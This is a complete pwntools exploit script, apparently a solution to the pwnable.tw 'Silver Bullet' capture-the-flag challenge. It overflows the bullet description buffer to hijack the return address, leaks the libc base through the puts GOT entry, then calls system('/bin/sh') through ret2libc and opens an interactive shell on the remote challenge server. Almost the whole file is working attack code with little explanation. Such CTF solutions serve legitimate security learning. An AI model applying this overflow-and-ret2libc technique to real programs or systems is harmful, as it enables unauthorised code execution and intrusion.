from pwn import *
from struct import pack

# Constants found by manual enumeration
BULLET_DESC_SZ = 0x30
BINSH_OFST  = 0x158e8b


def read_menu():
    MENU = (
        b'+++++++++++++++++++++++++++',
        b'       Silver Bullet       ',
        b'+++++++++++++++++++++++++++',
        b' 1. Create a Silver Bullet ',
        b' 2. Power up Silver Bullet ',
        b' 3. Beat the Werewolf      ',
        b' 4. Return                 ',
        b'+++++++++++++++++++++++++++\n',
    )
    p.recvuntil(MENU)


def create_bullet(desc):
    p.sendafter(b'Your choice :', b'1')
    p.sendafter(b'Give me your description of bullet :', desc)
    p.recvuntil(b'Good luck !!\n')


def power_up(desc):
    p.sendafter(b'Your choice :', b'2')
    p.sendafter(b'Give me your another description of bullet :', desc)
    p.recvuntil(b'Enjoy it !\n')


def beat():
    p.sendafter(b'Your choice :', b'3')
    p.recvuntil(b'Try to beat it .....\n')
    fight_result = p.recvline()
    if fight_result == b'Sorry ... It still alive !!\n':
        p.recvuntil(b'Give me more power !!\n')
        return False
    else:
        return True


def kill_beast():
    while True:
        if beat():
            break



###############################################################################
## Environment setup
###############################################################################
e = ELF('./patched')
libc = ELF('./libc_32.so.6')
if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    p = remote('chall.pwnable.tw', 10103)
else:
    p = process('./patched', env={'LD_PRELOAD': '/home/k/pwnabletw/SilverBullet/libc_32.so.6'})

if len(sys.argv) > 2 and sys.argv[2] == 'debug':
    gdb.attach(p)
    raw_input(b'Continue and press ENTER key to send payload')


###############################################################################
## Exploit
###############################################################################

# Leak libc phrase
log.info("Started leak libc phrase...")
create_bullet(b'A' * (BULLET_DESC_SZ - 1))
power_up(b'B')

payload = b'C' * 7 + p32(e.plt['puts']) + p32(e.symbols['main']) + p32(e.got['puts'])
power_up(payload)

kill_beast()
puts = u32(p.recvline()[:-1])
libc_base = puts - libc.symbols['puts']
log.info("[x] Leaked libc_base: " + hex(libc_base))


# Spawn shell phrase
log.info("Started spawn shell phrase...")
create_bullet(b'A' * (BULLET_DESC_SZ - 1))
power_up(b'B')

payload = b'C' * 7
payload += p32(libc_base + libc.symbols['system']) + b'AAAA' + p32(libc_base + BINSH_OFST)
power_up(payload)

kill_beast()
p.interactive()